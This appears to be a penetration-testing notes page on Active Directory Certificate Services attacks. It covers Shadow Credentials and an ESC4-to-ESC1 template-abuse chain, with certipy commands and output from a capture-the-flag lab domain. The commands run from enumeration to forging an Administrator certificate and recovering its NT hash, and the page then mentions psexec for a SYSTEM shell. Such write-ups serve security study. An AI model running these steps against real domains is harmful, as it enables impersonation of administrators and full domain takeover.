---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ADCS

**Active Directory Certificate Services (ADCS)** is like an internal digital ID system for a Windows domain. Instead of printing physical ID cards, it **issues digital certificates** **that users and computers can use to log in**, encrypt communications, or sign data. These certificates are trusted across the domain, so if an attacker can trick ADCS into giving them a certificate, it's similar to getting a valid employee badge — they can **impersonate someone else** and gain access.

## Shadow Credentials

The **Shadow Credentials** attack abuses the `msDS-KeyCredentialLink` attribute in AD to add a malicious authentication certificate to an account — typically a service or privileged account. This allows the attacker to **impersonate** the target account via certificate-based authentication (PKINIT), **without needing their password or hash**.

{% hint style="warning" %}
#### Requirements:

* The attacker **must have** `Write` **access** to the target's `msDS-KeyCredentialLink` attribute.
* ADCS must be configured to allow **certificate-based authentication (PKINIT)**.
{% endhint %}

`certipy shadow auto` automates the shadow credentials attack by injecting a forged certificate into a target account's `msDS-KeyCredentialLink` attribute. It authenticates with provided credentials, adds the malicious credential, and requests a certificate tied to the target:

```bash
certipy shadow auto -u <user@domain> -p <pass> -account 'ca_svc' -dc-ip <dc-ip>
```

This results in the two files and a hash:

* **`.pfx`** : contains the **certificate and private key** the attacker got from the CA. It can be imported into Windows or used with tools that support PKI authentication to authenticate as the user.
* **`.ccache`**: this is a **Kerberos credential cache** file, generated after using the certificate for PKINIT (certificate-based Kerberos auth). It allows us to **authenticate with Kerberos tickets as that user** without a password or NT hash. Tools like `impacket` or `kinit` can use it to get tickets.
* **NT hash:** this is extracted from memory (via the Key Credential attack), giving us a password-equivalent credentia**l** we can use in typical NTLM-based attacks like Pass-the-Hash or SMB authentication.

## ESC Attacks

{% hint style="info" %}
The terms **ESC1**, **ESC4**, etc., come from a **threat model and classification system** introduced by SpecterOps. These labels don’t stand for acronyms — **ESC** simply means **ESCalation** — and they’re followed by a number to identify different types of attack paths related to ADCS.
{% endhint %}

<table><thead><tr><th width="79.6666259765625">Label</th><th width="375.3333740234375">Description</th><th>Key Risk</th></tr></thead><tbody><tr><td><strong>ESC4</strong></td><td>Control over Cert Publisher user lets attacker modify templates</td><td>Template abuse (e.g., leads to ESC1)</td></tr><tr><td><strong>ESC1</strong></td><td>Weak template allows users to request certs for others (incl. admins)</td><td>Identity impersonation</td></tr></tbody></table>

{% hint style="danger" %}
This **ESC4 → ESC1** chain is especially dangerous as it **leverages legitimate ADCS functionality**, making detection difficult. Issued certificates may remain valid for years, providing **long-term persistence** unless explicitly revoked. For an example of this attack chain see [EscapeTwo](https://x7331.gitbook.io/boxes/boxes/easy/escapetwo#privilege-escalation).
{% endhint %}

### Template Abuse (ESC4)

**ESC4** is a misconfiguration where a low-privileged user can take control of another account — typically a member of the `Cert Publishers` group. Since `Cert Publishers` can modify certificate templates, gaining control of such an account lets an attacker edit a template to make it vulnerable to **ESC1**. This means weakening the template's settings to allow certificate requests without proper validation or approval, enabling certificate-based impersonation of privileged users.

{% tabs %}
{% tab title="1. Enumerate writable templates" %}
{% code overflow="wrap" %}
```bash
# Enumerate vulnerable templates
$ certipy find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vuln
...
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
...
    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```
{% endcode %}
{% endtab %}

{% tab title="2. Modify the template" %}
{% code overflow="wrap" %}
```bash
# Make the template vulnerable to ESC1
$ certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
...
[*] Successfully updated 'DunderMifflinAuthentication'
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Identity Hijack (ESC1)

Once the template is misconfigured, the attacker can request a certificate for a privileged account like a `Domain Admin`. Because validation is bypassed, ADCS issues a valid certificate, allowing the attacker to authenticate as that user, extract credentials (e.g., NTLM hashes), and escalate to full domain control.

{% tabs %}
{% tab title="1. Request Certificate" %}
{% code overflow="wrap" %}
```bash
# Request a certificate for the Administrator account
$ certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -target dc01.sequel.htb -target-ip 10.10.11.51
...
[*] Wrote certificate and private key to 'administrator.pfx'
```
{% endcode %}
{% endtab %}

{% tab title="2. Authenticate" %}
{% code overflow="wrap" %}
```bash
# Authenticate as the administrator using the PFX file
$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
Certipy v5.0.2 - by Oliver Lyak (ly4k)
...
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```
{% endcode %}
{% endtab %}
{% endtabs %}

We can then use `impacket-psexec` to get a `SYSTEM` shell.

## Resources

* SpecterOps _Certified Pre-Owned (2021)_ whitepaper ([article](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf))
* RBT's in depth article and video walkthrough about the ESC4 attack ([article](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/))
